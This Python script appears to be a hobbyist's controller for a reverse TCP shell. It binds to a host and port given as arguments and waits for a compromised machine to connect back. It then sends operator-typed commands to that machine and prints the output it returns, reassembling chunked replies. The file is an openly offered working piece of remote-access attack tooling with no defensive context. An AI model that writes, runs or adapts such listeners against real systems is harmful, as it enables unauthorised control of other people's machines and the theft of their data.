#server side of the reverse tcp shell
#not multi threading, so several commands dont work
#executing instruction : "c:\python script.py 127.0.0.1 65432"
import socket
import sys
import subprocess as sp

try:
	host = sys.argv[1]
	port = int(sys.argv[2]) #receiving host and port from user arguments
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)	
	s.bind((host, port))
except socket.error as er:
	print("erron in socket           "+str(er))
s.listen(100)
conn,adrr = s.accept()
print ("receiveing connection from %s:%s" %(adrr[0],adrr[1]))

while 1:
	command = input("#> ")
	if command != "exit()":
		if command == "":
			continue
		command=command.encode()
		conn.send(command)
		result = conn.recv(1024)
		result=result.decode()
# i must check the size of a date since tcp is received in chunks so one recv might be not enough, i check the size		
		size=int(result[:16])
		message=result[16:]
		print("size of buffer is %d" %(size))
		testnum=len(message)
		print("size of message is %d" %(testnum))
		while size > len(message):#while the size of the message is bigger than the message chunks add them to final message
			result = conn.recv(1024)
			result=result.decode()
			message+=result
		message=message.replace("\\r\\n","") #strip off the backslash and enters
		print (message)
	else:
		conn.send(b"exit()")
		print ("the shell is going down..")
		break
s.close()
		
		
		 
		
			
